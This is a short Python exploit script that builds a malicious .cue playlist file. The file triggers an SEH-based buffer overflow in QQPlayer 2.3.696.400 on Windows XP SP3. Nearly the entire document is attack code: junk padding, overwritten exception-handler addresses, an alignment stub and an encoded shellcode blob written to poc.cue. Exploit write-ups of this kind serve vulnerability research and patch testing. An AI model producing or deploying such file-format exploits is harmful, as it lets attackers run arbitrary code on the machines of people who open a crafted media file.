#!/usr/bin/env python
 
#################################################################
#
# Title: QQPlayer cue File Buffer Overflow Exploit
# Author: Lufeng Li of Neusoft Corporation
# Vendor: www.qq.com
# Platform: Windows XPSP3 Chinese Simplified
# Tested: QQPlayer 2.3.696.400
# Vulnerable: QQPlayer<=2.3.696.400p1
#
#################################################################
# Code :
 
head = '''FILE "'''
junk = "A" * 780
nseh ="\x42\x61\x21\x61"
seh  ="\xa9\x9e\x41\x00"
adjust="\x32\x42\x61\x33\xca\x83\xc0\x10"
shellcode=("hffffk4diFkTpj02Tpk0T0AuEE2C4s4o0t0w174t0c7L0T0V7L2z1l131o2q1k2D1l081o"
           "0v1o0a7O2r0T3w3e1P0a7o0a3Y3K0l3w038N5L0c5p8K354q2j8N5O00PYVTX10X41PZ41"
           "H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2C5CJO1E0G1I4T1R2M0T1V7L1TKL2CK"
           "NK0KN2EKL08KN1FKO1Q7LML2N3W46607K7N684H310I9W025DOL1S905A4D802Z5DOO01")
junk_="R"*8000
foot ='''.avi" VIDEO'''+"\x0a"'''TRACK 02 MODE1/8888'''+"\x0a"+"INDEX 08 08:08:08"
payload=head+junk+nseh+seh+adjust+shellcode+junk_+foot
 
fobj = open("poc.cue","w")
fobj.write(payload)
fobj.close()